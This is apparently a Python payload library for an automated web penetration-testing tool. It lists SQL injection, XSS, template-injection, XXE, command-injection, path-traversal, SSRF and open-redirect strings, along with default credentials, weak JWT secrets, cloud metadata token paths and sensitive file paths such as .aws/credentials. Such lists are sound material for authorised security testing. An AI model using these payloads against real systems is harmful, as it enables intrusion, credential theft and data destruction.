"""
pentest/payloads.py
Payload library for all pentest modules.
SQLi, XSS, SSTI, XXE, CMDi, path traversal, SSRF, open redirect.
Each payload set has: raw payloads, WAF-evasion variants, and
descriptions for evidence/reporting.
"""


# ── SQLi ─────────────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    # Error-based
    "'",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "1' AND 1=CONVERT(int,(SELECT @@version))--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    # Time-based blind
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR SLEEP(5)#",
    "1' AND (SELECT SLEEP(5))#",
    "' OR BENCHMARK(10000000,SHA1('test'))#",
    # Boolean blind
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND SUBSTRING(@@version,1,1)='5",
    # Stacked queries
    "'; DROP TABLE test--",
    "'; SELECT pg_sleep(5)--",
]

SQLI_INDICATORS = [
    "sql syntax", "mysql", "ORA-", "PLS-", "postgresql",
    "microsoft sql", "sqlite3", "unclosed quotation",
    "unterminated string", "SQLSTATE", "syntax error",
    "query failed", "pg_query", "mysql_fetch",
    "Warning: mysql", "valid MySQL result",
    "supplied argument is not a valid",
]


# ── XSS ──────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<details open ontoggle=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    'javascript:alert(1)//',
    '"><img src=x onerror=alert(1)>',
    "{{constructor.constructor('alert(1)')()}}",     # Angular
    "${alert(1)}",                                     # Template literal
    '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
]

XSS_CANARY = "s3nt1n4l"  # unique string to detect reflection


# ── SSTI ─────────────────────────────────────────────────────────────

SSTI_PAYLOADS = [
    # Detection
    ("{{7*7}}",            "49",        "Jinja2/Twig"),
    ("${7*7}",             "49",        "Freemarker/Velocity"),
    ("#{7*7}",             "49",        "Ruby ERB / Thymeleaf"),
    ("<%= 7*7 %>",         "49",        "ERB"),
    ("{{7*'7'}}",          "7777777",   "Jinja2 string multiply"),
    ("${7*7}",             "49",        "EL injection"),
    ("@(1+2)",             "3",         "Razor"),
    # Exploitation probes (non-destructive)
    ("{{config}}",         "SECRET",    "Jinja2 config leak"),
    ("{{self.__class__}}", "class",     "Jinja2 class access"),
    ("${T(java.lang.Runtime).getRuntime()}", "Runtime", "Spring EL RCE"),
]


# ── XXE ──────────────────────────────────────────────────────────────

XXE_PAYLOADS = [
    {
        "name":    "XXE file read",
        "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "indicator": "root:x:0:0",
    },
    {
        "name":    "XXE SSRF",
        "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
        "indicator": "ami-id",
    },
    {
        "name":    "XXE parameter entity",
        "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/hostname"> %xxe;]><root>test</root>',
        "indicator": "",
    },
    {
        "name":    "XXE billion laughs (detection only)",
        "payload": '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><root>&lol2;</root>',
        "indicator": "lollol",
    },
]


# ── Command Injection ────────────────────────────────────────────────

CMDI_PAYLOADS = [
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "$(id)",
    "`id`",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; ping -c 3 127.0.0.1",
    "| ping -c 3 127.0.0.1",
    "; sleep 5",
    "| sleep 5",
    "|| sleep 5",
    "& timeout 5",
]

CMDI_INDICATORS = [
    "uid=", "gid=", "groups=",
    "root:x:0", "bin/bash",
    "PING 127.0.0.1",
    "64 bytes from",
]


# ── Path Traversal ───────────────────────────────────────────────────

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....\\\\....\\\\....\\\\windows\\\\win.ini",
    "/etc/passwd%00",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
]

PATH_INDICATORS = [
    "root:x:0:0",
    "[fonts]",       # win.ini
    "for 16-bit",    # win.ini
]


# ── SSRF ─────────────────────────────────────────────────────────────

SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://0x7f000001",
    "http://0177.0.0.1",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/v1/",
    "http://100.100.100.200/latest/meta-data/",   # Alibaba
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:6379/INFO",
]


# ── Open Redirect ────────────────────────────────────────────────────

REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "/\\evil.com",
    "//evil%2Ecom",
    "/%0d/evil.com",
    "///evil.com",
    "////evil.com",
    "https:evil.com",
    "http://evil.com%2F%2F",
    "///evil.com/%2F..",
]

REDIRECT_PARAMS = [
    "url", "redirect", "redirect_url", "redirect_uri",
    "next", "return", "returnTo", "return_url", "continue",
    "dest", "destination", "redir", "go", "target", "out",
    "view", "link", "ref", "callback",
]


# ── Default Credentials ─────────────────────────────────────────────

DEFAULT_CREDS = [
    # (service_pattern, username, password)
    ("tomcat",      "tomcat",     "tomcat"),
    ("tomcat",      "admin",      "admin"),
    ("tomcat",      "admin",      "tomcat"),
    ("jenkins",     "admin",      "admin"),
    ("jenkins",     "admin",      "password"),
    ("jboss",       "admin",      "admin"),
    ("weblogic",    "weblogic",   "weblogic1"),
    ("weblogic",    "weblogic",   "welcome1"),
    ("glassfish",   "admin",      "admin"),
    ("phpmyadmin",  "root",       ""),
    ("phpmyadmin",  "root",       "root"),
    ("phpmyadmin",  "root",       "mysql"),
    ("wordpress",   "admin",      "admin"),
    ("wordpress",   "admin",      "password"),
    ("grafana",     "admin",      "admin"),
    ("kibana",      "elastic",    "changeme"),
    ("rabbitmq",    "guest",      "guest"),
    ("mongodb",     "admin",      "admin"),
    ("redis",       "",           ""),
    ("postgres",    "postgres",   "postgres"),
    ("mysql",       "root",       "root"),
    ("mysql",       "root",       ""),
    ("minio",       "minioadmin", "minioadmin"),
    ("portainer",   "admin",      "admin"),
    ("sonarqube",   "admin",      "admin"),
    ("nexus",       "admin",      "admin123"),
    ("airflow",     "airflow",    "airflow"),
    ("superset",    "admin",      "admin"),
    ("zabbix",      "Admin",      "zabbix"),
    ("nagios",      "nagiosadmin","nagios"),
    ("elasticsearch","elastic",   "changeme"),
    ("splunk",      "admin",      "changeme"),
    ("spring-boot", "",           ""),         # actuator endpoints need no auth
    ("consul",      "",           ""),
    ("etcd",        "",           ""),
    ("vault",       "",           ""),
    ("harbor",      "admin",      "Harbor12345"),
    ("gitea",       "gitea",      "gitea"),
    ("drone",       "admin",      "admin"),
    ("argo",        "admin",      "admin"),
]


# ── JWT Weak Keys ────────────────────────────────────────────────────

JWT_WEAK_SECRETS = [
    "secret", "password", "123456", "changeme",
    "key", "your-256-bit-secret", "my_secret",
    "jwt_secret", "supersecret", "test",
    "qwerty", "admin", "default", "",
    "HS256", "s3cr3t", "letmein",
]


# ── Security Headers ────────────────────────────────────────────────

REQUIRED_SECURITY_HEADERS = {
    "Strict-Transport-Security":   "Missing HSTS — allows SSL stripping attacks",
    "X-Content-Type-Options":      "Missing X-Content-Type-Options — MIME sniffing risk",
    "X-Frame-Options":             "Missing X-Frame-Options — clickjacking risk",
    "Content-Security-Policy":     "Missing CSP — XSS amplification risk",
    "X-XSS-Protection":           "Missing X-XSS-Protection header",
    "Referrer-Policy":            "Missing Referrer-Policy — data leakage risk",
    "Permissions-Policy":         "Missing Permissions-Policy header",
}


# ── Cloud Patterns ───────────────────────────────────────────────────

S3_BUCKET_PATTERNS = [
    "{domain}-assets",
    "{domain}-backup",
    "{domain}-backups",
    "{domain}-data",
    "{domain}-dev",
    "{domain}-files",
    "{domain}-logs",
    "{domain}-media",
    "{domain}-prod",
    "{domain}-public",
    "{domain}-staging",
    "{domain}-static",
    "{domain}-uploads",
    "{company}-assets",
    "{company}-backup",
    "{company}-data",
    "{company}-dev",
    "{company}-staging",
]

GCP_METADATA_PATHS = [
    "/computeMetadata/v1/",
    "/computeMetadata/v1/project/project-id",
    "/computeMetadata/v1/instance/service-accounts/default/token",
    "/computeMetadata/v1/instance/service-accounts/default/email",
    "/computeMetadata/v1/instance/hostname",
    "/computeMetadata/v1/instance/zone",
]


# ── CORS origins ─────────────────────────────────────────────────────

CORS_ORIGINS = [
    "https://evil.com",
    "null",
    "https://attacker.example.com",
]


# ── Directory Bruteforce Paths ───────────────────────────────────────

COMMON_PATHS = [
    ".env", ".git/config", ".git/HEAD", ".svn/entries",
    ".DS_Store", "robots.txt", "sitemap.xml",
    "wp-login.php", "wp-admin/", "administrator/",
    "admin/", "login/", "api/", "graphql",
    "swagger.json", "swagger-ui.html", "api-docs",
    "openapi.json", "v1/", "v2/",
    ".well-known/security.txt",
    "server-status", "server-info",
    "actuator", "actuator/health", "actuator/env",
    "debug/", "test/", "backup/", "old/", "temp/",
    "console", "manage", "phpinfo.php",
    "elmah.axd", "trace.axd",
    ".htaccess", ".htpasswd", "web.config",
    "crossdomain.xml", "clientaccesspolicy.xml",
    "package.json", "composer.json",
    "Dockerfile", "docker-compose.yml",
    ".aws/credentials", "config.yml", "config.json",
]
